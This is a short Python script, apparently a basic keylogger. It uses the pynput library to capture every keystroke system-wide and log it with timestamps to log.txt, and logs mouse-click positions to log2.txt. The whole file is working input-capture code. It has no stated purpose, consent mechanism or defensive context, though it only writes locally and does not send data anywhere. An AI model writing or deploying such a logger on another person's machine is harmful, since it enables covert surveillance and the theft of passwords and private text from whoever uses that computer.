from pynput import keyboard
from pynput import mouse
import time

keyThreshold = 10
keyCount = 0
keys = []

mouseThreshold = 5
mouseCount = 0
mouses = []


def on_key_press(key):
    global keys, keyCount
    keys.append(key)
    keyCount += 1

    if keyCount >= keyThreshold:
        keyCount = 0
        submit_keys(keys)
        keys = []

def on_key_release(key):
    pass


def submit_keys(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(time.asctime(time.gmtime(time.time())) + ": " +str(key) + '\n')


def on_move(x, y):
    pass

def on_click(x, y, button, pressed):
    global mouses, mouseCount
    mouses.append('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)) +'\n')
    mouseCount += 1
    if mouseCount >= mouseThreshold:
        mouseCount = 0
        submit_mouses(mouses)
        mouses = []

def on_scroll(x, y, dx, dy):
    pass

def submit_mouses(mouses):
    with open("log2.txt", "a") as f:
        for mouse in mouses:
            f.write(mouse)


listener1 = keyboard.Listener(on_press=on_key_press, on_release=on_key_release) 
listener1.start()



with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener2:
    listener2.join()